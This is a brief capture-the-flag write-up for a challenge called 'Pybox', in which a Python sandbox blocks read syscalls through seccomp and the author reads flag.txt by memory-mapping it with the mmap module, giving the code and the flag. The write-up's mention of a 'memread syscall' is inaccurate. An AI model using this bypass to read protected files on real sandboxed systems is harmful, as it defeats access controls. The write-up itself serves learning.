# Pybox

The challenge was a sandbox challenge and we were given the source of the secured server box which is a python interpreter which can import modules and also execute the python code we pass to it, It does not allow any read syscall from executing. This is implemented using the seccomp with BLOCKED-SYSCALLS = [0, 17, 19] which corresponds to all the read syscalls. So we need to find a way to read the flag.txt file from the server without the help of any read syscalls.

So the first approach was to look at any other syscall which would in turn red the file contents without invoking the `BLOCKED-SYSCALLS`. This search led to mmap module in python.

```python
import mmap

filepath="flag.txt"
file_object= open(filepath,mode="r",encoding="utf8")
mmap_object= mmap.mmap(file_object.fileno(),length=0,access=mmap.ACCESS_READ,offset=0)
txt=mmap_object.read()
print(txt)

```

On executing the above code we were able to invoke read of the file contects from the memory using the memread syscall. 

flag `gigem{m3m0ry_m4pp3d_f1l35}`
